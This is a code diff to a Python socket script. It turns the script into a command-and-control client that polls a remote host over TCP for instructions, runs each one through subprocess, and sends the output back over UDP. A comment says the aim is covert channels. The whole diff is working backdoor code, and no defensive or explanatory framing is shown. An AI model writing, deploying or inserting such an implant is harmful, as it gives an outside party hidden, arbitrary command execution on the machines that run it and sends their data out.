@@ -1,5 +1,6 @@
 import socket as Socket
 import time
+import subprocess
 
 WAITTIME = 0.001
 PORT = 1234
@@ -35,13 +36,31 @@ def send_traffic(message:str):
     udpSock.sendto(b"END",(HOST,PORT))
 
 
+def recv_traffic() -> str: #TODO improve this for better covert channels
+    tcpSock = build_socket(Socket.SOCK_STREAM)
+    tcpSock.connect((HOST,PORT))
+    output = tcpSock.recv(1024).decode()
+    tcpSock.close()
+    return output
+
+
+def handle_traffic(instructions:str):
+    if instructions == "SLP": #No pending commands, check back later
+        time.sleep(5)
+        output = ""
+    else: #Command received. Execute and return results
+        instructionTokens = instructions.split(" ")
+        output = subprocess.run(instructionTokens,capture_output=True).stdout.decode()
+    return output
+
 
 def main():
     udpSock = build_socket(Socket.SOCK_DGRAM)
+    toSend = ""
 
     while True:
-        toSend = input("Message to send: ").strip()
         send_traffic(toSend)
+        toSend = handle_traffic(recv_traffic())
 
 
 main()
